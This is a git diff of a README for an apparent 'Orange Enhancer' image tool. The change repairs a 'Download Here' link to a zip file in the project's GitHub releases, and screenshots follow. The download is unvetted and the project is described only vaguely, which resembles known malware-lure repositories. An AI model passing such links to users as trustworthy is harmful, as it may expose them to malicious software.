@@ -6,7 +6,7 @@ An advanced software suite designed to enhance, process, and optimize orange ima
 
 Click the link below to get the latest release:
 
-👉 **[Download Here]([https://github.com](https://github.com/LogiCraft-dotcom/Orange-Enhancer-Software-v2.0/releases/download/OrangeEnhancer/Orange-Enhancer-Customer.zip))**
+👉 **[Download Here](https://github.com/LogiCraft-dotcom/Orange-Enhancer-Software-v2.0/releases/download/OrangeEnhancer/Orange-Enhancer-Customer.zip))**
 
 ## ✨ Features<img width="1280" height="755" alt="14f95262-6912-446f-a2b8-fbb6e440feaa" src="https://github.com/user-attachments/assets/775ef80b-6cfb-4e79-b39d-a892ba597053" />
 <img width="1279" height="693" alt="29712eae-3a6d-480d-9046-7782d50664fe" src="https://github.com/user-attachments/assets/1045d39b-77ce-4487-b89f-37e524c9b823" />
